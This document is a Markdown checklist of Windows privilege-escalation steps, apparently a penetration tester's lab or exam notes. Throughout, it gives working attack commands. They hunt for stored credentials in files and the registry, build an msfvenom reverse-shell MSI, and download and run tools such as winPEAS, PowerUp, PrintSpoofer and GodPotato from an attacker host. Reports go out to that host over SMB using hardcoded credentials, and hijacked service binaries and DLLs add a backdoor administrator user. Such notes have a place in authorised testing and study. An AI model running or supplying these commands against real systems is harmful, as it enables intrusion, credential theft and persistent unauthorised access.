
# Windows privesc initial checks

- [ ] Check directory that a shell was spawned into
- [ ] Whoami
```c
whoami
```
- [ ] whoami /priv - check for `SERestorePrivilege` and `SEImpersonatePrivilege` to gain system privs
```c
whoami /priv
```
- [ ] Check users that we could use for further privesc
```c
net user
```
- [ ] systeminfo to check for system exploits
```
*systeminfo*
```
- [ ] Check C:\ drive
- [ ] Check Program Files
- [ ] Check Program Files x86
- [ ] Check for keepass database
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```
- [ ] Check for XAMPP configuration files
```powershell
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```
- [ ] View mysql configuration file
```powershell
type C:\xampp\mysql\bin\my.ini
```
- [ ] Search for documents in a user's directory
```powershell
Get-ChildItem -Path C:\Users\xxx\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```
- [ ] Get process with unique names
```
Get-Process | Select-Object -Property ProcessName -Unique
```
- [ ] Get path to history file
```powershell
(Get-PSReadlineOption).HistorySavePath
```
- [ ] Find unquoted service paths with CMD
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
- [ ] Get tasks with powershell
```
schtasks /query /fo LIST /v
```
- [ ] Enumerate SMB Shares
```
crackmapexec smb 192.168.xxx.xxx -u user -p password --shares
```
- [ ] AlwaysInstallElevated
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\

# Check for AlwaysInstallElevated = 1 , if yes create a msfvenom msi payload 
# IF 64 bits use: %SystemRoot%\Sysnative\reg.exe

msfvenom -p windows/shell_reverse_tcp lhost= lport= -f msi -o setup.msi
msiexec /quiet /qn /i C:\Temp\setup.msi
```
- [ ] Other registry queries
```
### VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"  
reg query "HKCU\Software\TightVNC\Server"  

### Windows autologin  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"  
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  

### SNMP Paramters  
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"  

### Putty  
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"  

### Search for password in registry  
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /s  
```

- [ ] REGSVC ACL
```
Check for registry services 
> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
Look for access group permissions for NT AUTH/Interactive 

Create a new window service binary, check attack directory for source (net user add works) 
> x86_64-w64-mingw32-gcc windows_service.c -o x.exe

Add to the registry path 
> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
Execute using 
> sc start regsvc 
```

- [ ] If RDP, try ProcMon to look for DLLs
- [ ] If mail server, try capstone lab from chapter 11
### Automated enum
- [ ] Windows-privesc-check
```
iwr -uri http://192.168.45.xxx/windows-privesc-check2.exe -Outfile windows-privesc-check2.exe 
.\windows-privesc-check2.exe --audit -a -o privesc-report.txt

impacket-smbserver -smb2support test $(pwd) -username er83@R@39nfr0E4 -password kfro@59e$w$21fN$ # on kali

New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\192.168.45.xxx\er83@R@39nfr0E4" -Credential (New-Object System.Management.Automation.PSCredential("er83@R@39nfr0E4", (ConvertTo-SecureString "kfro@59e$w$21fN$" -AsPlainText -Force))) -Persist

Copy-Item -Path "C:\Users\xxx\privesc-report.txt" -Destination "Z:\privesc-report.txt

Remove-PSDrive -Name "Z"
```

- [ ] PowerUp.ps1
```
iwr -uri http://192.168.45.xxx/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1

Get-ModifiableServiceFile > powerup-modifiable-files.txt

impacket-smbserver -smb2support test $(pwd) -username er83@R@39nfr0E4 -password kfro@59e$w$21fN$ # on kali

New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\192.168.45.xxx\er83@R@39nfr0E4" -Credential (New-Object System.Management.Automation.PSCredential("er83@R@39nfr0E4", (ConvertTo-SecureString "kfro@59e$w$21fN$" -AsPlainText -Force))) -Persist

Copy-Item -Path "C:\Users\xxx\powerup-modifiable-files.txt" -Destination "Z:\powerup-modifiable-files.txt

Remove-PSDrive -Name "Z"
```

- [ ] winPEASx64.exe
```
iwr -uri http://192.168.45.xxx/winPEASx64.exe -Outfile winPEASx64.exe
.\winPEASx64.exe > winpeas.txt

impacket-smbserver -smb2support test $(pwd) -username er83@R@39nfr0E4 -password kfro@59e$w$21fN$ # on kali

New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\192.168.45.xxx\er83@R@39nfr0E4" -Credential (New-Object System.Management.Automation.PSCredential("er83@R@39nfr0E4", (ConvertTo-SecureString "kfro@59e$w$21fN$" -AsPlainText -Force))) -Persist

Copy-Item -Path "C:\Users\xxx\winpeas.txt" -Destination "Z:\winpeas.txt

Remove-PSDrive -Name "Z"
```

- [ ] Sherlock.ps1 - check for exploits
```
iwr -uri http://192.168.45.xxx/Sherlock.ps1 -Outfile Sherlock.ps1
.\Sherlock.ps1

Find-AllVulns < sherlock.txt

impacket-smbserver -smb2support test $(pwd) -username er83@R@39nfr0E4 -password kfro@59e$w$21fN$ # on kali

New-PSDrive -Name "Z" -PSProvider FileSystem -Root "\\192.168.45.xxx\er83@R@39nfr0E4" -Credential (New-Object System.Management.Automation.PSCredential("er83@R@39nfr0E4", (ConvertTo-SecureString "kfro@59e$w$21fN$" -AsPlainText -Force))) -Persist

Copy-Item -Path "C:\Users\xxx\sherlock.txt" -Destination "Z:\sherlock.txt

Remove-PSDrive -Name "Z"
```
### Non Standard Process
- [ ] Check file path
```
Get-Process -Name NonStandardProcess | Select-Object -ExpandProperty Path
```
- [ ] Get permissions
```
icacls "C:\xampp\apache\bin\httpd.exe"
```


---
# Privesc Techniques


## SEImpersonatePrivilege

- [ ] PrintSpooler
```
iwr -uri http://192.168.xxx.xxx/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
.\PrintSpoofer64.exe -i -c powershell.exe
```

- [ ] GodPotato
```
iwr -uri http://192.168.xxx.xxx/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
.\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\proof.txt"
.\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\proof.txt"
```

- [ ] If these both fail somehow on a newly created shell, try juicy potato or rouge potato (requires smb)
## Service Binary Hijacking

- [ ] Found a running service with a binary
- [ ] Verified that the current user has write access
```
icacls "C:\path\to\executable.exe"
```
- [ ] Recompile *adduser* if not using x86_64 from kali
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
- [ ] Download adduser
```
iwr -uri http://192.168.xxx.xxx/adduser.exe -Outfile adduser.exe
```
- [ ] Check if dave2 already exists
```
net user
```
- [ ] Copy adduser to file path
```
move .\adduser.exe C:\path\to\executable.exe
```
- [ ] Attempt to restart system
```
shutdown /r /t 0
```
- [ ] Restart Service
```
Restart-Service service
```
- [ ] Check if dave2 exists
```
net user
```
- [ ] Log in with dave2:password123!
## Service DLL Hijacking

- [ ] Found a running service with a DLL
- [ ] Verified that the current user has write access
```
icacls "C:\path\to\dll.dll"
``````
- [ ] Recompile *mydll* if not using x86_64 from kali
```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
- [ ] Download mydll
```
iwr -uri http://192.168.xxx.xxx/myDLL.dll -Outfile myDLL.dll
```
- [ ] Check if dave2 already exists
```
net user
```
- [ ] Copy adduser to file path
```
move .\myDLL.dll C:\path\to\dll.dll
```
- [ ] Attempt to restart system
```
shutdown /r /t 0
```
- [ ] Restart Service
```
Restart-Service service
```
- [ ] Check if dave2 exists
```
net user
```
- [ ] Log in with dave2:password123!

## Unquoted Service Paths

- [ ] Can exploit path traversals for the following order
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
- [ ] Double check permissions
```
icacls C:\Program Files
```
- [ ] Recompile *adduser* if not using x86_64 from kali
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
- [ ] Download adduser
```
iwr -uri http://192.168.xxx.xxx/adduser.exe -Outfile adduser.exe
```
- [ ] Check if dave2 already exists
```
net user
```
- [ ] Copy adduser to file path where it will execute first
```
move .\adduser.exe C:\path\to\executable.exe
```
- [ ] Attempt to restart system
```
shutdown /r /t 0
```
- [ ] Restart Service
```
Restart-Service service
```
- [ ] Check if dave2 exists
```
net user
```
- [ ] Log in with dave2:password123!